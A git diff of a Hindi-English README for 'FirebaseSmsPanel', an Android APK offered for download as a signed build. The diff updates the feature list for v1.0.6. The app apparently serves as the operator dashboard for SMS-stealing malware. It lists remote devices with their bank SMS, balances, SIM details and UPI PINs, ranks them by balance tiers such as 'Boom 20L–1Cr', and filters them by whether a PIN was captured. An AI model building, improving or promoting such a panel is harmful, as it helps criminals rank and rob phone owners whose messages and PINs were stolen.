@@ -4,8 +4,8 @@ Alag Android app — repo ke bots / Virtus APK se **alag**. TXT me Firebase RTDB
 
 ## Signed APK
 
-**Download (latest signed, v1.0.5):**  
-`https://github.com/hivirtusss/V2-testing-done/raw/cursor/firebase-sms-panel-apk-8042/releases/FirebaseSmsPanel-1.0.5-release-signed.apk`
+**Download (latest signed, v1.0.6):**  
+`https://github.com/hivirtusss/V2-testing-done/raw/cursor/firebase-sms-panel-apk-8042/releases/FirebaseSmsPanel-1.0.6-release-signed.apk`
 
 **Signed** — phone pe “Install unknown apps” allow karo. Older: `FirebaseSmsPanel-1.0-release-signed.apk` (purana build).
 
@@ -43,7 +43,7 @@ Optional (unsigned, agar repo me rakha ho):
 4. **Export TXT** → filtered device list share (Telegram/Drive).
 5. **Search Here** + right pe **connection chip** (tap = Online → Offline → Both cycle) — device id / model / SIM / Firebase URL / sender / SMS text se filter.
 6. **Dark dashboard** (Virtus screenshot jaisa): top row **TXT + Export TXT** (panel count), second row full-width **Fetch Live** (text squeeze nahi hota); metrics cards, pills: **High 1L-20L, Boom 20L-1Cr, Medium 5K, Low→High**, PIN, sort ₹/Battery, SMS age. **App icon** = tumhara **Virtus GT SMS MODULE** logo.
-7. **Device list** — short preview: **model, online/offline, balance · SMS count**. Battery / SIM / UPI PIN / messages **sirf card tap ya Info** pe sheet mein. Action column **thumb / info / trash** (approve/delete UI only). **Live SMS** white cards, **MSG** green.
+7. **Device list** — Virtus dark cards: **#index**, gradient phone icon + online dot, **device id**, **yellow balance badge**, **green “MSG:”** line (recent bank SMS after fetch). Battery / SIM / UPI PIN **sirf card tap ya Info (i)** pe **yellow sheet** mein; messages neeche white cards. Side pe **star** (UI only). **Live SMS** = grey strip par white cards, **MSG** green.
 8. **Bank+Band tiers** — presets: **High 1L–20L**, **Boom 20L–90L** (label “1Cr style”), **Medium 5K–1L**, **Low→High 2K–50K**. **All bank** = purana 50K–90L / 2K–50K High/Low sort (no tier preset).
 9. **Sort list by** (bank modes): **₹** ya **Battery %** (devices jo filters se pass ho).
 10. **Virtus-style dashboard** — cards: DEVICES, ONLINE, BALANCE, BANK SMS, PANELS; **Live SMS** = filtered recent messages.
@@ -51,7 +51,7 @@ Optional (unsigned, agar repo me rakha ho):
 12. **PIN filter** — Bank modes: With / Without / Both (device-level UPI/PIN detection).
 13. **SMS age** — `1d` … `30d` ya **All** (timestamp missing = still shown).
 14. **Live refresh** — **Fetch Live** = 45s job ON.
-15. **Device Details** — card tap ya **Info (i)**; sheet me SIM, battery, forwarder, UPI PIN, SMS list. **v1.0.5**
+15. **Device Details** — card tap ya **Info (i)**; **yellow** background, white card: **Balance (fetch)**, battery, SIM, forwarder, UPI PIN, SMS list (green MSG). **v1.0.6**
 
 ## Data
 
